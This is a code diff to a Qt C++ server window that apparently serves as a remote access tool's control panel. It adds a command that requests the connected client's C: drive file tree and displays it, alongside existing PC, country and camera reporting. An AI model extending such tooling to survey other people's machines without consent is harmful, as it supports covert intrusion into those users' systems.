@@ -8,6 +8,7 @@ MainWindow::MainWindow(QWidget *parent)
     ui->setupUi(this);
     ServerStartup();
     ui->optionsWidget->hide();
+    ui->filesWidget->hide();
 }
 
 MainWindow::~MainWindow()
@@ -23,7 +24,7 @@ void MainWindow::ServerStartup()
         client = server->nextPendingConnection();
         clientsCounter++;
         qDebug() << "[+] Client succesful connected to the server. Client IP: " << client->peerAddress();
-        AuthClientToTable(client); //Для таблицы
+        AuthClientToTable(client);
 
         QObject::connect(client,&QTcpSocket::readyRead,this,[&](){
             qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();
@@ -42,7 +43,15 @@ void MainWindow::ServerStartup()
                 osLanguageLabel->setText(parts[4]);
                 countryLabel->setText(parts[5]);
                 camLabel->setText(parts[6]);
+            }
 
+            if(data.startsWith("#getCFileTree:"))
+            {
+                data = data.mid(14);
+                cFiles += data;
+
+
+                workWithCFiles();
             }
 
         });
@@ -164,4 +173,36 @@ void MainWindow::getClientInformation(QTcpSocket *socket)
 {
     QByteArray requestForPcName = "#getPcInformation";
     socket->write(requestForPcName);
+}
+
+void MainWindow::on_filesButton_clicked()
+{
+    ui->filesWidget->show();
+    ui->filesWidget->move(ui->optionsWidget->x()+115,ui->optionsWidget->y());
+
+}
+
+
+void MainWindow::on_showC_clicked()
+{
+    QByteArray requestForPcName = "#getCFileTree";
+    client->write(requestForPcName);   
+}
+
+void MainWindow::workWithCFiles()
+{
+    ui->stackedWidget->setCurrentIndex(1);
+
+    QWidget *container = new QWidget();
+
+    QLabel *label = new QLabel(container);
+    label->setText(cFiles);
+    label->setWordWrap(true);
+    label->adjustSize();
+
+    container->setMinimumSize(label->size());
+
+    ui->scrollAreaC->setWidget(container);
+    ui->scrollAreaC->setWidgetResizable(false);
+    qDebug() << cFiles;
 }
